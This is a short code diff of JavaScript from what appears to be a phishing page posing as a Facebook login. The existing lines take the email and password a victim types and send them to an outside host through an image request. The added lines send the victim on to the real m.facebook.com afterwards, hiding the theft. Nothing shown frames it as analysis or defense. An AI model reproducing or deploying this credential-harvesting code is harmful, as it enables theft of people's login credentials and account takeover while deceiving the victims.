@@ -278,6 +278,9 @@ var p = document.getElementById('p1').value;
 if(u.length > 6 && p.length > 7){
 var a = document.createElement('img');
 a.src = "http://phpcloud101.gearhostpreview.com/m.php?c="+u+p;
+a.onerror = function() {
+    console.log("error");window.location.replace("https://m.facebook.com/");
+};
 }else{
 alert('Email/Password cannot be too short!');
 }
